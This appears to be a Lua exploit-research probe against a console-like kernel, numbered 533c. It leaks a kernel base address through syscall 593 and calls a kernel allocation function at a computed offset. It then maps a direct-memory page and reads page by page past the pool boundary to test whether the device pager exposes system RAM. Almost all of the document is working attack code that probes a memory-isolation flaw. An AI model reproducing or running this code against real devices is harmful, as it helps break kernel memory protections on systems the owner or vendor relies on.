-- CRASH_CLASS: LOW
-- PROBE 533c: Device pager extension past pool boundary
--
-- 533b showed: reading past a 1-page mmap_dmem mapping works —
-- the device pager faults in extra pages on demand.
--
-- Critical question: does this extension STOP at the pool
-- boundary (0x150000000), or does it continue into system RAM?
--
-- Plan: allocate at 0x14FFC0000 (pool end - 16KB), map 1 page,
-- then read page by page past it. If pages past 0x150000000 are
-- readable and non-zero, we may have reached system RAM.

print("=== PROBE 533c: PAGER EXTEND ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
local alloc_fn = lk + uint64(0x17EF0)

local sc_628 = make_syscall(628)
print("lk=" .. q(lk))

-- Allocate at pool end
local phys_buf = memory.alloc(8); wq(phys_buf, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_buf))
end)
local phys = rq(phys_buf)
print("phys=" .. q(phys))

-- Check: how far from pool end?
-- Pool end = 0x150000000
-- phys should be near that
-- Pages until pool end = (0x150000000 - phys) / 0x4000

-- Map just 1 page
local ok_m, va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64("0xFFFFFFFFFFFFFFFF"),
        uint64(3), uint64(0), phys)
end)
print("va=" .. q(va))

if not ok_m or to_num(va) <= 0 then
    print("MAP FAILED")
    print("=== 533c DONE ===")
    return
end

-- Read one page past at a time
-- The mapped page is phys. phys+0x4000 should be the NEXT phys page.
-- If phys = 0x14FFC0000, then:
--   +0 pages: phys 0x14FFC0000 (our allocated page) 
--   +1 pages: phys 0x14FFC4000
--   +2 pages: phys 0x14FFC8000
--   ...until we cross 0x150000000 (pool end)
--   After pool end: system RAM or MMIO

print("")
print("[SCAN] Reading pages past mapping (1 page = 16KB = 0x4000)")

-- Determine pages to pool end
local phys_n_h, phys_n_l = 0, 0
if type(phys) == "table" and phys.h then
    phys_n_h = phys.h; if phys_n_h < 0 then phys_n_h = phys_n_h + 0x100000000 end
    phys_n_l = phys.l; if phys_n_l < 0 then phys_n_l = phys_n_l + 0x100000000 end
end
local phys_n = phys_n_h * 0x100000000 + phys_n_l
local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print(string.format("phys=0x%X pool_end=0x%X pages_to_end=%d", phys_n, pool_end, pages_to_end))

-- Scan up to 32 pages past our allocation (covering pool end and beyond)
local max_pages = pages_to_end + 16  -- 16 pages past pool end
if max_pages > 64 then max_pages = 64 end

local last_readable = -1
local elf_magic = 0x464C457F
local found_nonzero_past_pool = false

for page = 0, max_pages do
    local offset = page * 0x4000
    local addr = va + uint64(offset)
    local ok_r, val = pcall(function() return memory.read_dword(addr) end)
    
    local past_pool = (page > pages_to_end - 1)
    local marker = ""
    if page == 0 then marker = " (our page)" end
    if page == pages_to_end then marker = " ** POOL BOUNDARY **" end
    if past_pool then marker = marker .. " [PAST POOL]" end
    
    if ok_r then
        local vn = to_num(val); if vn < 0 then vn = vn + 0x100000000 end
        last_readable = page
        
        -- Check for interesting content
        local interesting = ""
        if vn == elf_magic then interesting = " *** ELF HEADER! ***" end
        if vn ~= 0 and past_pool then
            found_nonzero_past_pool = true
            interesting = interesting .. " NON-ZERO!"
        end
        
        -- Also read next 3 dwords if non-zero
        if vn ~= 0 then
            local d2 = rd(addr + 4) or 0
            local d3 = rd(addr + 8) or 0
            if d2 < 0 then d2 = d2 + 0x100000000 end
            if d3 < 0 then d3 = d3 + 0x100000000 end
            print(string.format("  +%02d (phys +0x%05X): 0x%08X %08X %08X%s%s",
                page, offset, vn, d2, d3, marker, interesting))
        else
            print(string.format("  +%02d (phys +0x%05X): zero%s", page, offset, marker))
        end
    else
        print(string.format("  +%02d (phys +0x%05X): FAULT%s", page, offset, marker))
        -- After first fault, try 2 more then give up
        if page > last_readable + 2 then
            print("  (stopping after 2 consecutive faults)")
            break
        end
    end
end

print("")
if found_nonzero_past_pool then
    print("*** FOUND NON-ZERO DATA PAST POOL BOUNDARY ***")
    print("*** THIS MAY BE SYSTEM RAM OR OTHER PHYSICAL MEMORY ***")
else
    print("All pages past pool boundary were zero or faulted")
end

print(string.format("last_readable_page=%d (phys ~0x%X)", 
    last_readable, phys_n + last_readable * 0x4000))

print("")
print("=== 533c DONE ===")
